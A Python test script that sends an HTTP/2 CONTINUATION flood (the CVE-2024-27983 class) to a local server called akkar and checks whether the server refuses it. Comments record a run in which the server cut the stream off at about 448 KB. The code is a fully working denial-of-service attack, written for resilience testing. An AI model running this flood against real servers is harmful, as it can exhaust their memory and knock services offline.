#!/usr/bin/env python3
# CONTINUATION flood against akkar's HTTP/2 -- the CVE-2024-27983 class.
#
# A HEADERS frame without END_HEADERS, then CONTINUATION frames for ever, none
# ending the block. A server that accumulates the fragments with no cap on
# their SUM grows its memory until it dies.
#
# RESULT, on the benchmark box 2026-08-20, against akkar h2c:
#
#   refused after ~448 KB accumulated, GOAWAY 0x1 (PROTOCOL_ERROR)
#   RSS flat at 13.4 MB, server still answers h2
#
# The vendored h2_stream.lua:1138 rechecks recv_headers_buffer_length +
# #payload against MAX_HEADER_BUFFER_SIZE (400 KB) on EVERY CONTINUATION, so
# the bound is on the sum and not per frame. 448 rather than 400 is the 16 KB
# frame granularity: the 25th frame is the one that crosses.
#
# Two dead ends worth keeping. A 16 KB block of zeros as the first fragment
# reads as an HPACK "indexed field, index 0" and can trip COMPRESSION_ERROR
# before the size check -- so the flood must not corrupt HPACK to test the
# size path. And the handshake SETTINGS the server sends back is not a refusal;
# an early version read it as one and reported "refused after 16 KB" when the
# server had refused nothing. Parse the frame type before believing a refusal.
# CONTINUATION flood, take two: drain the server's own frames first, then flood
# and detect a REAL refusal (GOAWAY/RST/close), not the handshake SETTINGS.
import socket, struct, time, os

PORT = int(os.environ.get("PORT", "18091"))
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def frame(ftype, flags, sid, payload):
    return (struct.pack(">I", len(payload))[1:] + bytes([ftype, flags])
            + struct.pack(">I", sid & 0x7fffffff) + payload)

def parse_frames(buf):
    out, i = [], 0
    while i + 9 <= len(buf):
        ln = struct.unpack(">I", b"\x00" + buf[i:i+3])[0]
        ft, fl = buf[i+3], buf[i+4]
        if i + 9 + ln > len(buf):
            break
        payload = buf[i+9:i+9+ln]
        out.append((ft, fl, payload))
        i += 9 + ln
    return out

s = socket.create_connection(("127.0.0.1", PORT), timeout=10)
s.sendall(PREFACE)
s.sendall(frame(0x4, 0x0, 0, b""))
s.sendall(frame(0x4, 0x1, 0, b""))               # SETTINGS ACK

# Drain whatever the server sends at handshake (its SETTINGS, etc).
s.settimeout(0.5)
try:
    while True:
        d = s.recv(4096)
        if not d:
            break
except socket.timeout:
    pass

# HEADERS on stream 1, no END_HEADERS. Minimal valid-ish HPACK.
s.sendall(frame(0x1, 0x0, 1, b"\x82\x86\x84\x41\x8a"))

chunk = b"\x00" * 16384
BURST = 4  # frames antes de checar resposta
sent, refused, reason = 0, False, None
deadline = time.time() + 25
s.settimeout(2)
try:
    burst_i = 0
    while time.time() < deadline:
        s.sendall(frame(0x9, 0x0, 1, chunk))
        sent += len(chunk)
        burst_i += 1
        if burst_i % BURST != 0:
            continue
        s.settimeout(0.05)
        try:
            back = s.recv(4096)
            if not back:
                refused, reason = True, "server closed the connection"
                break
            frames = parse_frames(back)
            for ft, fl, pl in frames:
                if ft == 0x7:                    # GOAWAY
                    code = struct.unpack(">I", pl[4:8])[0] if len(pl) >= 8 else -1
                    refused, reason = True, "GOAWAY code 0x%x" % code
                elif ft == 0x3:                  # RST_STREAM
                    code = struct.unpack(">I", pl[0:4])[0] if len(pl) >= 4 else -1
                    refused, reason = True, "RST_STREAM code 0x%x" % code
            if refused:
                break
        except socket.timeout:
            s.settimeout(2)
            continue
except (BrokenPipeError, ConnectionResetError) as e:
    refused, reason = True, "connection reset (%s)" % type(e).__name__

print("CONTINUATION enviado: %d bytes (%.2f MB)" % (sent, sent/1024/1024))
if refused:
    print("RECUSADO apos ~%.0f KB: %s" % (sent/1024, reason))
else:
    print("NAO RECUSADO em 25 s -- acumulacao potencialmente ilimitada")
s.close()
